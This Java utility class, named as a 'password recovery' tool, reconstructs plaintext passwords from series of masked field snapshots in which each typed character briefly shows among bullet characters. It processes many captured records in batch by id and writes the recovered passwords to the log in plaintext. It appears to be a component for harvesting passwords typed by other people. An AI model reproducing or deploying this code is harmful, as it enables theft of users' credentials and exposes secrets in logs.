package io.renren.common.utils;

import lombok.extern.slf4j.Slf4j;

import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * 密码恢复工具类 - 完整实现
 */
@Slf4j
public class PasswordRecoveryUtils {
    
    private static final String TAG = "{}";
    private static final Pattern BULLET_PATTERN = Pattern.compile("^•+$");
    private static final Pattern NON_BULLET_PATTERN = Pattern.compile("[^•]");
    
    /**
     * 密码字符信息类
     */
    public static class PasswordCharInfo {
        public final String character;  // 字符内容
        public final int position;      // 位置（0开始）
        
        public PasswordCharInfo(String character, int position) {
            this.character = character;
            this.position = position;
        }
        
        @Override
        public String toString() {
            return String.format("PasswordCharInfo{char='%s', pos=%d}", character, position);
        }
        
        @Override
        public boolean equals(Object obj) {
            if (this == obj) return true;
            if (obj == null || getClass() != obj.getClass()) return false;
            PasswordCharInfo that = (PasswordCharInfo) obj;
            return position == that.position && Objects.equals(character, that.character);
        }
        
        @Override
        public int hashCode() {
            return Objects.hash(character, position);
        }
    }
    
    /**
     * 密码恢复结果类
     */
    public static class PasswordRecoveryResult {
        public final String password;           // 恢复的密码
        public final boolean isValid;           // 是否有效
        public final String message;            // 结果消息
        public final int confidence;            // 置信度 (0-100)
        public final Map<Integer, Character> charMap; // 字符位置映射
        
        public PasswordRecoveryResult(String password, boolean isValid, String message, 
                                    int confidence, Map<Integer, Character> charMap) {
            this.password = password;
            this.isValid = isValid;
            this.message = message;
            this.confidence = confidence;
            this.charMap = charMap != null ? new HashMap<>(charMap) : new HashMap<>();
        }
        
        @Override
        public String toString() {
            return String.format("PasswordRecoveryResult{password='%s', valid=%s, confidence=%d%%, message='%s'}", 
                password, isValid, confidence, message);
        }
    }
    
    /**
     * 密码分析结果类
     */
    private static class PasswordAnalysis {
        boolean isValid = false;
        String errorMessage = "";
        int maxLength = 0;
        Map<Integer, List<Character>> positionHistory = new HashMap<>();
        List<String> validStates = new ArrayList<>();
        
        public void addCharAtPosition(int position, char character, int stateIndex) {
            positionHistory.computeIfAbsent(position, k -> new ArrayList<>()).add(character);
        }
        
        public Character getLatestCharAt(int position) {
            List<Character> history = positionHistory.get(position);
            return (history != null && !history.isEmpty()) ? 
                   history.get(history.size() - 1) : null;
        }
    }
    
    /**
     * 判断字符串是否全部由 • 字符组成
     */
    public static boolean isAllBullets(String text) {
        if (text == null || text.isEmpty()) {
            return false;
        }
        return BULLET_PATTERN.matcher(text).matches();
    }
    
    /**
     * 从密码掩码字符串中提取非•字符及其位置
     */
    public static PasswordCharInfo extractPasswordChar(String text) {
        if (text == null || text.isEmpty()) {
            return null;
        }
        
        Matcher matcher = NON_BULLET_PATTERN.matcher(text);
        if (matcher.find()) {
            String character = matcher.group();
            int position = matcher.start();
            return new PasswordCharInfo(character, position);
        }
        
        return null;
    }
    
    /**
     * 提取所有非•字符及其位置
     */
    public static List<PasswordCharInfo> extractAllPasswordChars(String text) {
        List<PasswordCharInfo> result = new ArrayList<>();
        
        if (text == null || text.isEmpty()) {
            return result;
        }
        
        Matcher matcher = NON_BULLET_PATTERN.matcher(text);
        while (matcher.find()) {
            String character = matcher.group();
            int position = matcher.start();
            result.add(new PasswordCharInfo(character, position));
        }
        
        return result;
    }
    
    /**
     * 基础密码恢复方法
     */
    public static String recoverPassword(List<String> inputStates) {
        if (inputStates == null || inputStates.isEmpty()) {
            return "";
        }
        
        // 找到最长的状态，确定密码总长度
        int maxLength = inputStates.stream()
                .filter(Objects::nonNull)
                .mapToInt(String::length)
                .max()
                .orElse(0);
        
        if (maxLength == 0) {
            return "";
        }
        
        // 初始化密码数组
        char[] password = new char[maxLength];
        Arrays.fill(password, '\0');
        
        // 逐个分析每个输入状态
        for (String state : inputStates) {
            if (state == null || state.isEmpty()) {
                continue;
            }
            
            // 提取当前状态中的明文字符
            List<PasswordCharInfo> visibleChars = extractAllPasswordChars(state);
            
            // 将明文字符放入对应位置
            for (PasswordCharInfo charInfo : visibleChars) {
                if (charInfo.position < maxLength) {
                    password[charInfo.position] = charInfo.character.charAt(0);
                }
            }
        }
        
        // 转换为字符串
        StringBuilder result = new StringBuilder();
        for (char c : password) {
            if (c != '\0') {
                result.append(c);
            }
        }
        
        return result.toString();
    }
    
    /**
     * 智能密码恢复 - 主要方法（推荐使用）
     */
    public static PasswordRecoveryResult recoverPasswordSmart(List<String> inputStates) {
        if (inputStates == null || inputStates.isEmpty()) {
            return new PasswordRecoveryResult("", false, "输入状态为空", 0, null);
        }
        
        try {
            log.info(TAG, "开始密码恢复，输入状态: " + inputStates.toString());
            
            // 预处理：过滤无效状态
            List<String> cleanStates = preprocessInputStates(inputStates);
            if (cleanStates.isEmpty()) {
                return new PasswordRecoveryResult("", false, "没有有效的输入状态", 0, null);
            }
            
            // 分析输入模式
            PasswordAnalysis analysis = analyzeInputPattern(cleanStates);
            if (!analysis.isValid) {
                return new PasswordRecoveryResult("", false, analysis.errorMessage, 0, null);
            }
            
            // 构建密码
            Map<Integer, Character> charMap = buildCharacterMap(analysis);
            String password = buildPasswordFromCharMap(charMap);
            
            // 计算置信度
            int confidence = calculateConfidence(password, charMap, analysis);
            
            // 验证密码
            boolean isValid = validateRecoveredPassword(password, cleanStates, charMap);
            
            String message = isValid ? "密码恢复成功" : "密码可能不完整";
            
            log.info(TAG, String.format("密码恢复完成: %s (置信度: %d%%)", password, confidence));
            
            return new PasswordRecoveryResult(password, isValid, message, confidence, charMap);
            
        } catch (Exception e) {
            log.warn(TAG, "密码恢复失败", e);
            return new PasswordRecoveryResult("", false, "恢复过程出错: " + e.getMessage(), 0, null);
        }
    }
    
    /**
     * 预处理输入状态
     */
    private static List<String> preprocessInputStates(List<String> inputStates) {
        List<String> cleanStates = new ArrayList<>();
        
        for (String state : inputStates) {
            if (state != null && !state.isEmpty()) {
                // 去除前后空格
                String trimmed = state.trim();
                if (!trimmed.isEmpty()) {
                    cleanStates.add(trimmed);
                }
            }
        }
        
        return cleanStates;
    }
    
    /**
     * 分析输入模式
     */
    private static PasswordAnalysis analyzeInputPattern(List<String> inputStates) {
        PasswordAnalysis analysis = new PasswordAnalysis();
        
        int maxLength = 0;
        int previousLength = 0;
        
        for (int i = 0; i < inputStates.size(); i++) {
            String state = inputStates.get(i);
            int currentLength = state.length();
            
            // 检查长度变化是否合理
            if (currentLength < previousLength - 1) {
                // 长度减少超过1，可能是删除操作，但我们继续处理
                log.warn(TAG, String.format("状态%d长度异常减少: %d -> %d", i, previousLength, currentLength));
            }
            
            maxLength = Math.max(maxLength, currentLength);
            previousLength = currentLength;
            
            // 提取明文字符并记录
            List<PasswordCharInfo> visibleChars = extractAllPasswordChars(state);
            for (PasswordCharInfo charInfo : visibleChars) {
                analysis.addCharAtPosition(charInfo.position, charInfo.character.charAt(0), i);
            }
            
            analysis.validStates.add(state);
        }
        
        analysis.isValid = true;
        analysis.maxLength = maxLength;
        
        return analysis;
    }
    
    /**
     * 构建字符映射表
     */
    private static Map<Integer, Character> buildCharacterMap(PasswordAnalysis analysis) {
        Map<Integer, Character> charMap = new HashMap<>();
        
        // 对每个位置，选择最后出现的字符
        for (int pos = 0; pos < analysis.maxLength; pos++) {
            Character latestChar = analysis.getLatestCharAt(pos);
            if (latestChar != null) {
                charMap.put(pos, latestChar);
            }
        }
        
        return charMap;
    }
    
    /**
     * 从字符映射表构建密码字符串
     */
    private static String buildPasswordFromCharMap(Map<Integer, Character> charMap) {
        if (charMap.isEmpty()) {
            return "";
        }
        
        // 找到最大位置
        int maxPos = charMap.keySet().stream().mapToInt(Integer::intValue).max().orElse(-1);
        
        // 构建密码数组
        char[] password = new char[maxPos + 1];
        Arrays.fill(password, '\0');
        
        // 填入字符
        for (Map.Entry<Integer, Character> entry : charMap.entrySet()) {
            int pos = entry.getKey();
            if (pos >= 0 && pos < password.length) {
                password[pos] = entry.getValue();
            }
        }
        
        // 转换为字符串，保留所有位置（包括可能的空位）
        StringBuilder result = new StringBuilder();
        for (int i = 0; i < password.length; i++) {
            if (password[i] != '\0') {
                // 如果前面有空位，用?填充（表示未知字符）
                while (result.length() < i) {
                    result.append('?');
                }
                result.append(password[i]);
            }
        }
        
        return result.toString();
    }
    
    /**
     * 计算置信度
     */
    private static int calculateConfidence(String password, Map<Integer, Character> charMap, PasswordAnalysis analysis) {
        if (password.isEmpty()) {
            return 0;
        }
        
        int totalPositions = analysis.maxLength;
        int confirmedPositions = charMap.size();
        int baseConfidence = (confirmedPositions * 100) / Math.max(totalPositions, 1);
        
        // 根据状态数量调整置信度
        int stateCount = analysis.validStates.size();
        int stateBonus = Math.min(20, stateCount * 2); // 最多加20分
        
        // 检查是否有未知字符
        int unknownChars = (int) password.chars().filter(ch -> ch == '?').count();
        int unknownPenalty = unknownChars * 10; // 每个未知字符减10分
        
        int finalConfidence = Math.max(0, Math.min(100, baseConfidence + stateBonus - unknownPenalty));
        
        return finalConfidence;
    }
    
    /**
     * 验证恢复的密码
     */
    private static boolean validateRecoveredPassword(String password, List<String> inputStates, Map<Integer, Character> charMap) {
        if (password.isEmpty() || inputStates.isEmpty()) {
            return false;
        }
        
        // 基本验证：密码长度应该不超过最长状态的长度
        int maxStateLength = inputStates.stream()
                .mapToInt(String::length)
                .max()
                .orElse(0);
        
        if (password.length() > maxStateLength) {
            return false;
        }
        
        // 验证：每个确认的字符位置应该在合理范围内
        for (Map.Entry<Integer, Character> entry : charMap.entrySet()) {
            int pos = entry.getKey();
            if (pos < 0 || pos >= maxStateLength) {
                return false;
            }
        }
        
        // 验证：不应该包含太多未知字符
        long unknownCount = password.chars().filter(ch -> ch == '?').count();
        return unknownCount <= password.length() / 2; // 未知字符不超过一半
    }
    
    /**
     * 批量恢复多个密码输入记录
     */
    public static Map<String, PasswordRecoveryResult> recoverMultiplePasswords(Map<String, List<String>> passwordRecords) {
        Map<String, PasswordRecoveryResult> results = new HashMap<>();
        
        for (Map.Entry<String, List<String>> entry : passwordRecords.entrySet()) {
            String id = entry.getKey();
            List<String> states = entry.getValue();
            
            PasswordRecoveryResult result = recoverPasswordSmart(states);
            results.put(id, result);
            
            log.info(TAG, String.format("密码恢复[%s]: %s", id, result.toString()));
        }
        
        return results;
    }
    
    /**
     * 获取密码恢复的详细信息
     */
    public static String getRecoveryDetails(PasswordRecoveryResult result) {
        if (result == null) {
            return "无恢复结果";
        }
        
        StringBuilder details = new StringBuilder();
        details.append("=== 密码恢复详情 ===\n");
        details.append("密码: ").append(result.password).append("\n");
        details.append("有效性: ").append(result.isValid ? "有效" : "无效").append("\n");
        details.append("置信度: ").append(result.confidence).append("%\n");
        details.append("消息: ").append(result.message).append("\n");
        details.append("字符映射:\n");
        
        if (result.charMap.isEmpty()) {
            details.append("  无字符映射\n");
        } else {
            for (Map.Entry<Integer, Character> entry : result.charMap.entrySet()) {
                details.append(String.format("  位置%d: '%s'\n", entry.getKey(), entry.getValue()));
            }
        }
        
        return details.toString();
    }
}